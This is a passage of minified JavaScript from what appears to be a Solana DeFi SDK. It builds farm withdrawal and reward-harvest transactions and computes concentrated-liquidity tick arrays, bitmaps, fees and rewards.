            txTipConfig: d,
          } = t,
          { rewardInfos: f } = n;
        !1 === this.scope.availability.removeFarm &&
          this.logAndCreateError(
            "farm withdraw feature disabled in your region"
          );
        let h = xB[n.programId];
        BB(h) || this.logAndCreateError("invalid farm program:", n.programId);
        let p = (await this.scope.api.fetchFarmKeysById({ ids: n.id }))[0],
          m = this.createTxBuilder(s);
        m.addCustomComputeBudget(l), m.addTipInstruction(d);
        let g = {};
        for (let _ of this.scope.account.tokenAccounts)
          if (a) {
            let t = y_(this.scope.ownerPubKey, _.mint).publicKey;
            _.publicKey &&
              t.equals(_.publicKey) &&
              (g[_.mint.toString()] = _.publicKey);
          } else g[_.mint.toString()] = _.publicKey;
        if (4 !== h) {
          let t = RB({
              programId: new Ji(n.programId),
              poolId: new Ji(n.id),
              owner: this.scope.ownerPubKey,
              version: h,
            }),
            e = await this.scope.connection.getAccountInfo(t);
          if (e)
            NB(h).decode(e.data).deposited.isZero() &&
              this.logAndCreateError("no deposited lp", { farmId: n.id });
          else if (6 !== h) {
            let { instruction: e, instructionType: n } = UB({
              id: new Ji(p.id),
              programId: new Ji(p.programId),
              version: h,
              ledger: t,
              owner: this.scope.ownerPubKey,
            });
            m.addInstruction({ instructions: [e], instructionTypes: [n] });
          }
        }
        o &&
          o.isZero() &&
          !(c || []).length &&
          this.logAndCreateError("no deposited lp", { farmId: n.id });
        let y = p.lpMint.address,
          w = i && y === GI.toString(),
          b = g[y.toString()];
        if (!b) {
          let { account: t, instructionParams: e } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: p.lpMint.programId,
              mint: new Ji(y),
              notUseTokenAccount: w,
              createInfo: { payer: s || this.scope.ownerPubKey, amount: 0 },
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !0,
              associatedOnly: !w && a,
              checkCreateATAOwner: u,
            });
          (b = t), e && m.addInstruction(e);
        }
        g[y.toString()] = b;
        let v = [];
        for (let _ of f) {
          let t = i && _.mint.address === GI.toString(),
            e = g[_.mint.address];
          if (!e) {
            let { account: n, instructionParams: r } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: _.mint.programId,
                mint: new Ji(_.mint.address),
                notUseTokenAccount: t,
                createInfo: { payer: s || this.scope.ownerPubKey, amount: 0 },
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !t,
                associatedOnly: !t && a,
                checkCreateATAOwner: u,
              });
            (e = n), r && m.addInstruction(r);
          }
          (g[_.mint.address] = e), v.push(e);
        }
        let A = CB({
          version: h,
          rewardInfos: f,
          rewardTokenAccountsPublicKeys: v,
        });
        A && this.logAndCreateError(A);
        let k = {
            amount: II(r),
            owner: this.scope.ownerPubKey,
            farmInfo: n,
            farmKeys: p,
            lpAccount: b,
            rewardAccounts: v,
            userAuxiliaryLedgers: null == c ? void 0 : c.map((t) => new Ji(t)),
          },
          I =
            6 === h
              ? KB(k)
              : 5 === h
              ? WB(k)
              : 4 === h
              ? (function (t) {
                  let {
                      farmInfo: e,
                      farmKeys: n,
                      lpAccount: r,
                      rewardAccounts: o,
                      owner: i,
                      amount: s,
                      userAuxiliaryLedgers: a,
                    } = t,
                    [u, c] = [new Ji(e.programId), new Ji(e.id)],
                    l = JT([UT("instruction"), zT("amount")]),
                    d = [
                      LI({ pubkey: c }),
                      LI({ pubkey: new Ji(n.authority), isWritable: !1 }),
                      LI({ pubkey: a[0] }),
                      LI({ pubkey: i, isSigner: !0, isWritable: !1 }),
                      LI({ pubkey: r }),
                      LI({ pubkey: new Ji(n.lpVault) }),
                      LI({ pubkey: o[0] }),
                      LI({ pubkey: new Ji(n.rewardInfos[0].vault) }),
                      LI({ pubkey: Ss, isWritable: !1 }),
                      LI({ pubkey: Bc, isWritable: !1 }),
                      LI({ pubkey: o[1] }),
                      LI({ pubkey: new Ji(n.rewardInfos[1].vault) }),
                    ],
                    f = dt.alloc(l.span);
                  return (
                    l.encode({ instruction: 2, amount: s }, f),
                    new vs({ keys: d, programId: u, data: f })
                  );
                })(k)
              : FB(k),
          S = { 3: WS, 4: jS, 5: VS, 6: ZS };
        return m
          .addInstruction({ instructions: [I], instructionTypes: [S[h]] })
          .versionBuild({ txVersion: e });
      }
      async withdrawFarmReward({
        farmInfo: t,
        withdrawMint: e,
        txVersion: n,
        computeBudgetConfig: r,
        txTipConfig: o,
        feePayer: i,
      }) {
        var s;
        this.scope.checkOwner();
        let a = eS((await this.scope.api.fetchFarmKeysById({ ids: t.id }))[0]),
          u = xB[t.programId];
        6 !== u && this.logAndCreateError("invalid farm version", u);
        let c = a.rewardInfos.find((t) => HI(t.mint.address).equals(HI(e)));
        c || this.logAndCreateError("withdraw mint error", "rewardInfos", t);
        let l,
          d = null != (s = null == c ? void 0 : c.vault) ? s : VI,
          f = this.createTxBuilder(i);
        if (e.equals(VI) || e.equals(Ji.default)) {
          let t = await rB({
            connection: this.scope.connection,
            owner: this.scope.ownerPubKey,
            payer: this.scope.ownerPubKey,
            amount: LB(
              _A(SA({}, c), {
                openTime: c.openTime,
                endTime: c.endTime,
                perSecond: new bI(c.perSecond)
                  .mul(10 ** c.mint.decimals)
                  .toString(),
              })
            ),
          });
          (l = t.addresses.newAccount), f.addInstruction(t);
        } else {
          let t = await this.scope.account.getCreatedTokenAccount({ mint: e });
          null === t
            ? ((l = await this.scope.account.getAssociatedTokenAccount(e)),
              f.addInstruction({
                instructions: [
                  vl(this.scope.ownerPubKey, l, this.scope.ownerPubKey, e),
                ],
                instructionTypes: [mS],
              }))
            : (l = t);
        }
        let { instruction: h, instructionType: p } = (function (t) {
          let e = dt.alloc(sB.span);
          sB.encode({ instruction: 5 }, e);
          let n = [
            LI({ pubkey: Bc, isWritable: !1 }),
            LI({ pubkey: t.id }),
            LI({ pubkey: t.authority, isWritable: !1 }),
            LI({ pubkey: t.lpVault, isWritable: !1 }),
            LI({ pubkey: t.rewardVault }),
            LI({ pubkey: t.userRewardToken }),
            LI({ pubkey: t.owner, isWritable: !1, isSigner: !0 }),
          ];
          return {
            instruction: new vs({ programId: t.programId, keys: n, data: e }),
            instructionType: QS,
          };
        })({
          programId: a.programId,
          id: a.id,
          authority: a.authority,
          lpVault: a.lpVault,
          rewardVault: d,
          userRewardToken: l,
          owner: this.scope.ownerPubKey,
        });
        return (
          f.addCustomComputeBudget(r),
          f.addTipInstruction(o),
          f
            .addInstruction({ instructions: [h], instructionTypes: [p] })
            .versionBuild({ txVersion: n })
        );
      }
      async harvestAllRewards(t) {
        let {
            farmInfoList: e,
            useSOLBalance: n,
            feePayer: r,
            associatedOnly: o = !0,
            checkCreateATAOwner: i = !1,
            userAuxiliaryLedgers: s,
            txVersion: a,
            computeBudgetConfig: u,
          } = t,
          c = this.createTxBuilder(r),
          l = {};
        for (let f of this.scope.account.tokenAccounts)
          if (o) {
            let t = y_(this.scope.ownerPubKey, f.mint).publicKey;
            f.publicKey &&
              t.equals(f.publicKey) &&
              (l[f.mint.toString()] = f.publicKey);
          } else l[f.mint.toString()] = f.publicKey;
        let d = (
          await this.scope.api.fetchFarmKeysById({
            ids: Object.values(e)
              .map((t) => t.id)
              .join(","),
          })
        ).reduce((t, e) => _A(SA({}, t), { [e.id]: e }), {});
        for (let f of Object.values(e)) {
          let { programId: t, lpMint: e, rewardInfos: a, id: u } = f,
            h = xB[t],
            p = e.address,
            m = n && p === GI.toString(),
            g = l[p];
          if (!g) {
            let { account: t, instructionParams: n } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: e.programId,
                mint: new Ji(p),
                notUseTokenAccount: m,
                createInfo: { payer: r || this.scope.ownerPubKey, amount: 0 },
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !0,
                associatedOnly: !m && o,
                checkCreateATAOwner: i,
              });
            (g = t), n && c.addInstruction(n);
          }
          l[p.toString()] = g;
          let y = [];
          for (let s of a) {
            let t = n && s.mint.address === GI.toString(),
              e = l[s.mint.address];
            if (!e) {
              let { account: n, instructionParams: a } =
                await this.scope.account.getOrCreateTokenAccount({
                  tokenProgram: s.mint.programId,
                  mint: new Ji(s.mint.address),
                  notUseTokenAccount: t,
                  createInfo: { payer: r || this.scope.ownerPubKey, amount: 0 },
                  owner: this.scope.ownerPubKey,
                  skipCloseAccount: !t,
                  associatedOnly: !t && o,
                  checkCreateATAOwner: i,
                });
              (e = n), a && c.addInstruction(a);
            }
            (l[s.mint.address] = e), y.push(e);
          }
          let w = d[u],
            b = {
              amount: nS,
              owner: this.scope.ownerPubKey,
              farmInfo: f,
              farmKeys: w,
              lpAccount: g,
              rewardAccounts: y,
              userAuxiliaryLedgers:
                null == s ? void 0 : s.map((t) => new Ji(t)),
            },
            v = 6 === h ? KB(b) : 5 === h ? WB(b) : FB(b),
            A = { 3: WS, 5: VS, 6: ZS };
          c.addInstruction({ instructions: [v], instructionTypes: [A[h]] });
        }
        return 1 === a
          ? c.sizeCheckBuild({ computeBudgetConfig: u })
          : c.sizeCheckBuildV0({ computeBudgetConfig: u });
      }
    },
    GB = new Yn(0),
    VB = new Yn(1),
    HB = new Yn(-1),
    ZB = new Yn(1).shln(64),
    XB = new Yn(1).shln(128),
    JB = ZB.sub(VB),
    YB = XB.subn(1),
    QB = -443636,
    $B = -QB,
    tC = new Yn("4295048016"),
    eC = new Yn("79226673521066979257578248091"),
    nC = new Yn("4295048017"),
    rC = new Yn("79226673521066979257578248090"),
    oC = new Yn(10).pow(new Yn(6)),
    iC = ((t) => (
      (t[(t.rate_500 = 500)] = "rate_500"),
      (t[(t.rate_3000 = 3e3)] = "rate_3000"),
      (t[(t.rate_10000 = 1e4)] = "rate_10000"),
      t
    ))(iC || {}),
    sC = {
      tvl: 0,
      volumeQuote: 0,
      mintAmountA: 0,
      mintAmountB: 0,
      rewardDefaultInfos: [],
      farmUpcomingCount: 0,
      farmOngoingCount: 0,
      farmFinishedCount: 0,
      day: {
        volume: 0,
        volumeQuote: 0,
        volumeFee: 0,
        apr: 0,
        feeApr: 0,
        priceMin: 0,
        priceMax: 0,
        rewardApr: [0],
      },
      week: {
        volume: 0,
        volumeQuote: 0,
        volumeFee: 0,
        apr: 0,
        feeApr: 0,
        priceMin: 0,
        priceMax: 0,
        rewardApr: [0],
      },
      month: {
        volume: 0,
        volumeQuote: 0,
        volumeFee: 0,
        apr: 0,
        feeApr: 0,
        priceMin: 0,
        priceMax: 0,
        rewardApr: [0],
      },
      pooltype: [],
    };
  function aC(t) {
    let e = new ArrayBuffer(2);
    return new DataView(e).setUint16(0, t, !1), new Uint8Array(e);
  }
  function uC(t) {
    let e = new ArrayBuffer(4);
    return new DataView(e).setInt32(0, t, !1), new Uint8Array(e);
  }
  function cC(t, e) {
    let n = 0;
    for (let r = t - 1; r >= 0 && !e.testn(r); r--) n++;
    return n;
  }
  function lC(t, e) {
    let n = 0;
    for (let r = 0; r < t && !e.testn(r); r++) n++;
    return n;
  }
  function dC(t, e) {
    for (let n = 0; n < t; n++) if (e.testn(n)) return !1;
    return !0;
  }
  new Yn("18446744073700000000"), dt.from("amm_config", "utf8");
  var fC = dt.from("pool", "utf8"),
    hC = dt.from("pool_vault", "utf8"),
    pC = dt.from("pool_reward_vault", "utf8"),
    mC = dt.from("position", "utf8"),
    gC = dt.from("tick_array", "utf8"),
    yC = dt.from("operation", "utf8"),
    wC = dt.from("pool_tick_array_bitmap_extension", "utf8"),
    bC = dt.from("observation", "utf8");
  function vC(t, e, n) {
    return f_([hC, e.toBuffer(), n.toBuffer()], t);
  }
  function AC(t, e, n) {
    return f_([gC, e.toBuffer(), uC(n)], t);
  }
  function kC(t, e, n, r) {
    return f_([mC, e.toBuffer(), uC(n), uC(r)], t);
  }
  function IC(t, e) {
    return f_([mC, e.toBuffer()], t);
  }
  function SC(t) {
    return f_([dt.from("metadata", "utf8"), FI.toBuffer(), t.toBuffer()], FI);
  }
  function _C(t) {
    return f_([yC], t);
  }
  function TC(t, e) {
    return f_([wC, e.toBuffer()], t);
  }
  var BC = dt.from("locked_position", "utf8");
  function CC(t, e) {
    return f_([BC, e.toBuffer()], t);
  }
  function EC(t, e) {
    return f_([BC, e.toBuffer()], t);
  }
  var xC = dt.from("support_mint", "utf8");
  function PC(t, e) {
    return f_([xC, e.toBuffer()], t);
  }
  var OC = class {
      static getfeeGrowthInside(t, e, n) {
        let r = new Yn(0),
          o = new Yn(0);
        t.tickCurrent >= e.tick
          ? ((r = e.feeGrowthOutsideX64A), (o = e.feeGrowthOutsideX64B))
          : ((r = t.feeGrowthGlobalX64A.sub(e.feeGrowthOutsideX64A)),
            (o = t.feeGrowthGlobalX64B.sub(e.feeGrowthOutsideX64B)));
        let i = new Yn(0),
          s = new Yn(0);
        return (
          t.tickCurrent < n.tick
            ? ((i = n.feeGrowthOutsideX64A), (s = n.feeGrowthOutsideX64B))
            : ((i = t.feeGrowthGlobalX64A.sub(n.feeGrowthOutsideX64A)),
              (s = t.feeGrowthGlobalX64B.sub(n.feeGrowthOutsideX64B))),
          {
            feeGrowthInsideX64A: UC.wrappingSubU128(
              UC.wrappingSubU128(t.feeGrowthGlobalX64A, r),
              i
            ),
            feeGrowthInsideBX64: UC.wrappingSubU128(
              UC.wrappingSubU128(t.feeGrowthGlobalX64B, o),
              s
            ),
          }
        );
      }
      static GetPositionFees(t, e, n, r) {
        let { feeGrowthInsideX64A: o, feeGrowthInsideBX64: i } =
            this.getfeeGrowthInside(t, n, r),
          s = UC.mulDivFloor(
            UC.wrappingSubU128(o, e.feeGrowthInsideLastX64A),
            e.liquidity,
            ZB
          ),
          a = e.tokenFeesOwedA.add(s),
          u = UC.mulDivFloor(
            UC.wrappingSubU128(i, e.feeGrowthInsideLastX64B),
            e.liquidity,
            ZB
          );
        return { tokenFeeAmountA: a, tokenFeeAmountB: e.tokenFeesOwedB.add(u) };
      }
      static GetPositionFeesV2(t, e, n, r) {
        let { feeGrowthInsideX64A: o, feeGrowthInsideBX64: i } =
            this.getfeeGrowthInside(t, n, r),
          s = UC.mulDivFloor(
            UC.wrappingSubU128(o, e.feeGrowthInsideLastX64A),
            e.liquidity,
            ZB
          ),
          a = e.tokenFeesOwedA.add(s),
          u = UC.mulDivFloor(
            UC.wrappingSubU128(i, e.feeGrowthInsideLastX64B),
            e.liquidity,
            ZB
          );
        return { tokenFeeAmountA: a, tokenFeeAmountB: e.tokenFeesOwedB.add(u) };
      }
      static GetPositionRewardsV2(t, e, n, r) {
        let o = [],
          i = this.getRewardGrowthInsideV2(t.tickCurrent, n, r, t.rewardInfos);
        for (let s = 0; s < i.length; s++) {
          let t = i[s],
            n = e.rewardInfos[s],
            r = UC.wrappingSubU128(t, n.growthInsideLastX64),
            a = UC.mulDivFloor(r, e.liquidity, ZB),
            u = n.rewardAmountOwed.add(a);
          o.push(u);
        }
        return o;
      }
      static GetPositionRewards(t, e, n, r) {
        let o = [],
          i = this.getRewardGrowthInside(t.tickCurrent, n, r, t.rewardInfos);
        for (let s = 0; s < i.length; s++) {
          let t = i[s],
            n = e.rewardInfos[s],
            r = UC.wrappingSubU128(t, n.growthInsideLastX64),
            a = UC.mulDivFloor(r, e.liquidity, ZB),
            u = n.rewardAmountOwed.add(a);
          o.push(u);
        }
        return o;
      }
      static getRewardGrowthInside(t, e, n, r) {
        let o = [];
        for (let i = 0; i < r.length; i++) {
          let s = new Yn(0);
          s = e.liquidityGross.eqn(0)
            ? r[i].rewardGrowthGlobalX64
            : t < e.tick
            ? r[i].rewardGrowthGlobalX64.sub(e.rewardGrowthsOutsideX64[i])
            : e.rewardGrowthsOutsideX64[i];
          let a = new Yn(0);
          n.liquidityGross.eqn(0) ||
            (a =
              t < n.tick
                ? n.rewardGrowthsOutsideX64[i]
                : r[i].rewardGrowthGlobalX64.sub(n.rewardGrowthsOutsideX64[i])),
            o.push(
              UC.wrappingSubU128(
                UC.wrappingSubU128(r[i].rewardGrowthGlobalX64, s),
                a
              )
            );
        }
        return o;
      }
      static getRewardGrowthInsideV2(t, e, n, r) {
        let o = [];
        for (let i = 0; i < r.length; i++) {
          let s = new Yn(0);
          s = e.liquidityGross.eqn(0)
            ? r[i].rewardGrowthGlobalX64
            : t < e.tick
            ? r[i].rewardGrowthGlobalX64.sub(e.rewardGrowthsOutsideX64[i])
            : e.rewardGrowthsOutsideX64[i];
          let a = new Yn(0);
          n.liquidityGross.eqn(0) ||
            (a =
              t < n.tick
                ? n.rewardGrowthsOutsideX64[i]
                : r[i].rewardGrowthGlobalX64.sub(n.rewardGrowthsOutsideX64[i])),
            o.push(
              UC.wrappingSubU128(
                UC.wrappingSubU128(r[i].rewardGrowthGlobalX64, s),
                a
              )
            );
        }
        return o;
      }
      static getAmountsFromLiquidity({
        poolInfo: t,
        ownerPosition: e,
        liquidity: n,
        slippage: r,
        add: o,
        epochInfo: i,
      }) {
        var s, a, u, c;
        let l = KC.priceToSqrtPriceX64(
            new bI(t.price),
            t.mintA.decimals,
            t.mintB.decimals
          ),
          d = KC.getSqrtPriceX64FromTick(e.tickLower),
          f = KC.getSqrtPriceX64FromTick(e.tickUpper),
          h = o ? 1 + r : 1 - r,
          p = FC.getAmountsFromLiquidity(l, d, f, n, o),
          [m, g] = [
            K_(
              p.amountA,
              null == (s = t.mintA.extensions) ? void 0 : s.feeConfig,
              i,
              !0
            ),
            K_(
              p.amountB,
              null == (a = t.mintB.extensions) ? void 0 : a.feeConfig,
              i,
              !0
            ),
          ],
          [y, w] = [
            K_(
              new Yn(new bI(p.amountA.toString()).mul(h).toFixed(0)),
              null == (u = t.mintA.extensions) ? void 0 : u.feeConfig,
              i,
              !0
            ),
            K_(
              new Yn(new bI(p.amountB.toString()).mul(h).toFixed(0)),
              null == (c = t.mintB.extensions) ? void 0 : c.feeConfig,
              i,
              !0
            ),
          ];
        return {
          liquidity: n,
          amountA: m,
          amountB: g,
          amountSlippageA: y,
          amountSlippageB: w,
          expirationTime: W_(m.expirationTime, g.expirationTime),
        };
      }
    },
    RC = class {
      static async getTickArrays(t, e, n, r, o, i, s) {
        let a = [],
          u = HC.getTickArrayStartIndexByTick(r, o),
          c = HC.getInitializedTickArrayInRange(i, s, o, u, Math.floor(7.5));
        for (let f = 0; f < c.length; f++) {
          let { publicKey: t } = AC(e, n, c[f]);
          a.push(t);
        }
        let l = (await RA(t, a)).map((t) =>
            null !== t ? nE.decode(t.data) : null
          ),
          d = {};
        for (let f = 0; f < a.length; f++) {
          let t = l[f];
          null !== t &&
            (d[t.startTickIndex] = _A(SA({}, t), { address: a[f] }));
        }
        return d;
      }
      static nextInitializedTick(t, e, n, r, o, i) {
        let {
          initializedTick: s,
          tickArrayAddress: a,
          tickArrayStartTickIndex: u,
        } = this.nextInitializedTickInOneArray(t, e, n, r, o, i);
        for (; null == s || s.liquidityGross.lten(0); ) {
          if (
            ((u = HC.getNextTickArrayStartIndex(u, o, i)),
            this.checkIsValidStartIndex(u, o))
          )
            throw new Error("No enough initialized tickArray");
          let r = n[u];
          if (void 0 === r) continue;
          let {
            nextTick: c,
            tickArrayAddress: l,
            tickArrayStartTickIndex: d,
          } = this.firstInitializedTickInOneArray(t, e, r, i);
          [s, a, u] = [c, l, d];
        }
        if (null == s) throw new Error("No invaild tickArray cache");
        return { nextTick: s, tickArrayAddress: a, tickArrayStartTickIndex: u };
      }
      static nextInitializedTickArray(t, e, n, r, o) {
        let i = Math.floor(t / RC.tickCount(e)),
          s = n
            ? HC.searchLowBitFromStart(r, o, i - 1, 1, e)
            : HC.searchHightBitFromStart(r, o, i + 1, 1, e);
        return s.length > 0
          ? { isExist: !0, nextStartIndex: s[0] }
          : { isExist: !1, nextStartIndex: 0 };
      }
      static firstInitializedTickInOneArray(t, e, n, r) {
        let o;
        if (r) {
          let t = GC - 1;
          for (; t >= 0; ) {
            let e = n.ticks[t];
            if (e.liquidityGross.gtn(0)) {
              o = e;
              break;
            }
            t -= 1;
          }
        } else {
          let t = 0;
          for (; t < GC; ) {
            let e = n.ticks[t];
            if (e.liquidityGross.gtn(0)) {
              o = e;
              break;
            }
            t += 1;
          }
        }
        let { publicKey: i } = AC(t, e, n.startTickIndex);
        return {
          nextTick: o,
          tickArrayAddress: i,
          tickArrayStartTickIndex: n.startTickIndex,
        };
      }
      static nextInitializedTickInOneArray(t, e, n, r, o, i) {
        let s,
          a = HC.getTickArrayStartIndexByTick(r, o),
          u = Math.floor((r - a) / o),
          c = n[a];
        if (null == c)
          return {
            initializedTick: void 0,
            tickArrayAddress: void 0,
            tickArrayStartTickIndex: a,
          };
        if (i)
          for (; u >= 0; ) {
            let t = c.ticks[u];
            if (t.liquidityGross.gtn(0)) {
              s = t;
              break;
            }
            u -= 1;
          }
        else
          for (u += 1; u < GC; ) {
            let t = c.ticks[u];
            if (t.liquidityGross.gtn(0)) {
              s = t;
              break;
            }
            u += 1;
          }
        let { publicKey: l } = AC(t, e, a);
        return {
          initializedTick: s,
          tickArrayAddress: l,
          tickArrayStartTickIndex: c.startTickIndex,
        };
      }
      static getArrayStartIndex(t, e) {
        let n = this.tickCount(e);
        return Math.floor(t / n) * n;
      }
      static checkIsValidStartIndex(t, e) {
        if (HC.checkIsOutOfBoundary(t)) {
          if (t > $B) return !1;
          return t == HC.getTickArrayStartIndexByTick(QB, e);
        }
        return t % this.tickCount(e) == 0;
      }
      static tickCount(t) {
        return GC * t;
      }
    },
    MC = class {
      static maxTickInTickarrayBitmap(t) {
        return t * GC * VC;
      }
      static getBitmapTickBoundary(t, e) {
        let n = this.maxTickInTickarrayBitmap(e),
          r = Math.floor(Math.abs(t) / n);
        t < 0 && Math.abs(t) % n != 0 && (r += 1);
        let o = n * r;
        return t < 0
          ? { minValue: -o, maxValue: -o + n }
          : { minValue: o, maxValue: o + n };
      }
      static nextInitializedTickArrayStartIndex(t, e, n, r) {
        if (!RC.checkIsValidStartIndex(e, n))
          throw Error("nextInitializedTickArrayStartIndex check error");
        let o = this.maxTickInTickarrayBitmap(n),
          i = r ? e - RC.tickCount(n) : e + RC.tickCount(n);
        if (i < -o || i >= o) return { isInit: !1, tickIndex: e };
        let s = n * GC,
          a = i / s + 512;
        i < 0 && i % s != 0 && a--;
        let u = Math.abs(a);
        if (r) {
          let e = (function (t, e) {
            return dC(t, e) ? null : cC(t, e);
          })(1024, t.shln(1024 - u - 1));
          if (null !== e) {
            return { isInit: !0, tickIndex: (u - e - 512) * s };
          }
          return { isInit: !1, tickIndex: -o };
        }
        {
          let e = (function (t, e) {
            return dC(t, e) ? null : lC(t, e);
          })(1024, t.shrn(u));
          if (null !== e) {
            return { isInit: !0, tickIndex: (u + e - 512) * s };
          }
          return { isInit: !1, tickIndex: o - RC.tickCount(n) };
        }
      }
    },
    LC = class {
      static getBitmapOffset(t, e) {
        if (!RC.checkIsValidStartIndex(t, e))
          throw new Error("No enough initialized tickArray");
        this.checkExtensionBoundary(t, e);
        let n = MC.maxTickInTickarrayBitmap(e),
          r = Math.floor(Math.abs(t) / n) - 1;
        return t < 0 && Math.abs(t) % n === 0 && r--, r;
      }
      static getBitmap(t, e, n) {
        let r = this.getBitmapOffset(t, e);
        return t < 0
          ? { offset: r, tickarrayBitmap: n.negativeTickArrayBitmap[r] }
          : { offset: r, tickarrayBitmap: n.positiveTickArrayBitmap[r] };
      }
      static checkExtensionBoundary(t, e) {
        let { positiveTickBoundary: n, negativeTickBoundary: r } =
          this.extensionTickBoundary(e);
        if (t >= r && t < n)
          throw Error("checkExtensionBoundary -> InvalidTickArrayBoundary");
      }
      static extensionTickBoundary(t) {
        let e = MC.maxTickInTickarrayBitmap(t),
          n = -e;
        if ($B <= e)
          throw Error(`extensionTickBoundary check error: ${$B}, ${e}`);
        if (n <= QB)
          throw Error(`extensionTickBoundary check error: ${n}, ${QB}`);
        return { positiveTickBoundary: e, negativeTickBoundary: n };
      }
      static checkTickArrayIsInit(t, e, n) {
        let { tickarrayBitmap: r } = this.getBitmap(t, e, n),
          o = this.tickArrayOffsetInBitmap(t, e);
        return {
          isInitialized: HC.mergeTickArrayBitmap(r).testn(o),
          startIndex: t,
        };
      }
      static nextInitializedTickArrayFromOneBitmap(t, e, n, r) {
        let o = RC.tickCount(e),
          i = n ? t - o : t + o,
          { tickarrayBitmap: s } = this.getBitmap(i, e, r);
        return this.nextInitializedTickArrayInBitmap(s, i, e, n);
      }
      static nextInitializedTickArrayInBitmap(t, e, n, r) {
        let { minValue: o, maxValue: i } = MC.getBitmapTickBoundary(e, n),
          s = this.tickArrayOffsetInBitmap(e, n);
        if (r) {
          let r = HC.mergeTickArrayBitmap(t).shln(VC - 1 - s),
            i = dC(512, r) ? null : cC(512, r);
          if (null !== i) {
            return { isInit: !0, tickIndex: e - i * RC.tickCount(n) };
          }
          return { isInit: !1, tickIndex: o };
        }
        {
          let r = HC.mergeTickArrayBitmap(t).shrn(s),
            o = dC(512, r) ? null : lC(512, r);
          if (null !== o) {
            return { isInit: !0, tickIndex: e + o * RC.tickCount(n) };
          }
          return { isInit: !1, tickIndex: i - RC.tickCount(n) };
        }
      }
      static tickArrayOffsetInBitmap(t, e) {
        let n = Math.abs(t) % MC.maxTickInTickarrayBitmap(e),
          r = Math.floor(n / RC.tickCount(e));
        return t < 0 && 0 != n && (r = VC - r), r;
      }
    },
    NC = class {
      static getOutputAmountAndRemainAccounts(t, e, n, r, o, i = !1) {
        let s = n.toBase58() === t.mintA.address,
          a = [],
          {
            isExist: u,
            startIndex: c,
            nextAccountMeta: l,
          } = this.getFirstInitializedTickArray(t, s);
        if (!u || void 0 === c || !l) throw new Error("Invalid tick array");
        a.push(l);
        let {
          allTrade: d,
          amountCalculated: f,
          accounts: h,
          sqrtPriceX64: p,
          feeAmount: m,
        } = jC.swapCompute(
          t.programId,
          t.id,
          e,
          t.tickArrayBitmap,
          t.exBitmapInfo,
          s,
          t.ammConfig.tradeFeeRate,
          t.liquidity,
          t.tickCurrent,
          t.tickSpacing,
          t.sqrtPriceX64,
          r,
          c,
          o,
          i
        );
        return (
          a.push(...h),
          {
            allTrade: d,
            expectedAmountOut: f.mul(HB),
            remainingAccounts: a,
            executionPrice: p,
            feeAmount: m,
          }
        );
      }
      static getInputAmountAndRemainAccounts(t, e, n, r, o) {
        let i = n.toBase58() === t.mintB.address,
          s = [],
          {
            isExist: a,
            startIndex: u,
            nextAccountMeta: c,
          } = this.getFirstInitializedTickArray(t, i);
        if (!a || void 0 === u || !c) throw new Error("Invalid tick array");
        try {
          let e = this.preInitializedTickArrayStartIndex(t, i);
          if (e.isExist) {
            let { publicKey: n } = AC(t.programId, t.id, e.nextStartIndex);
            s.push(n);
          }
        } catch {}
        s.push(c);
        let {
          amountCalculated: l,
          accounts: d,
          sqrtPriceX64: f,
          feeAmount: h,
        } = jC.swapCompute(
          t.programId,
          t.id,
          e,
          t.tickArrayBitmap,
          t.exBitmapInfo,
          i,
          t.ammConfig.tradeFeeRate,
          t.liquidity,
          t.tickCurrent,
          t.tickSpacing,
          t.sqrtPriceX64,
          r.mul(HB),
          u,
          o
        );
        return (
          s.push(...d),
          {
            expectedAmountIn: l,
            remainingAccounts: s,
            executionPrice: f,
            feeAmount: h,
          }
        );
      }
      static getFirstInitializedTickArray(t, e) {
        let { isInitialized: n, startIndex: r } =
          NC.isOverflowDefaultTickarrayBitmap(t.tickSpacing, [t.tickCurrent])
            ? LC.checkTickArrayIsInit(
                RC.getArrayStartIndex(t.tickCurrent, t.tickSpacing),
                t.tickSpacing,
                t.exBitmapInfo
              )
            : HC.checkTickArrayIsInitialized(
                HC.mergeTickArrayBitmap(t.tickArrayBitmap),
                t.tickCurrent,
                t.tickSpacing
              );
        if (n) {
          let { publicKey: e } = AC(t.programId, t.id, r);
          return { isExist: !0, startIndex: r, nextAccountMeta: e };
        }
        let { isExist: o, nextStartIndex: i } =
          this.nextInitializedTickArrayStartIndex(
            t,
            RC.getArrayStartIndex(t.tickCurrent, t.tickSpacing),
            e
          );
        if (o) {
          let { publicKey: e } = AC(t.programId, t.id, i);
          return { isExist: !0, startIndex: i, nextAccountMeta: e };
        }
        return { isExist: !1, nextAccountMeta: void 0, startIndex: void 0 };
      }
      static preInitializedTickArrayStartIndex(t, e) {
        let n = Math.floor(t.tickCurrent / RC.tickCount(t.tickSpacing)),
          r = e
            ? HC.searchHightBitFromStart(
                t.tickArrayBitmap,
                t.exBitmapInfo,
                n + 1,
                1,
                t.tickSpacing
              )
            : HC.searchLowBitFromStart(
                t.tickArrayBitmap,
                t.exBitmapInfo,
                n - 1,
                1,
                t.tickSpacing
              );
        return r.length > 0
          ? { isExist: !0, nextStartIndex: r[0] }
          : { isExist: !1, nextStartIndex: 0 };
      }
      static nextInitializedTickArrayStartIndex(t, e, n) {
        for (e = RC.getArrayStartIndex(t.tickCurrent, t.tickSpacing); ; ) {
          let { isInit: r, tickIndex: o } =
            MC.nextInitializedTickArrayStartIndex(
              HC.mergeTickArrayBitmap(t.tickArrayBitmap),
              e,
              t.tickSpacing,
              n
            );
          if (r) return { isExist: !0, nextStartIndex: o };
          e = o;
          let { isInit: i, tickIndex: s } =
            LC.nextInitializedTickArrayFromOneBitmap(
              e,
              t.tickSpacing,
              n,
              t.exBitmapInfo
            );
          if (i) return { isExist: !0, nextStartIndex: s };
          if ((e = s) < QB || e > $B) return { isExist: !1, nextStartIndex: 0 };
        }
      }
      static async updatePoolRewardInfos({
        connection: t,
        apiPoolInfo: e,
        chainTime: n,
        poolLiquidity: r,
        rewardInfos: o,
      }) {
        var i, s, a;
        let u = [];
        for (let c = 0; c < o.length; c++) {
          let l = o[c],
            d =
              null !=
              (a =
                null == (i = e.rewardDefaultInfos[c])
                  ? void 0
                  : i.mint.programId)
                ? a
                : null == (s = await t.getAccountInfo(l.tokenMint))
                ? void 0
                : s.owner;
          if (void 0 === d) throw Error("get new reward mint info error");
          let f = _A(SA({}, l), {
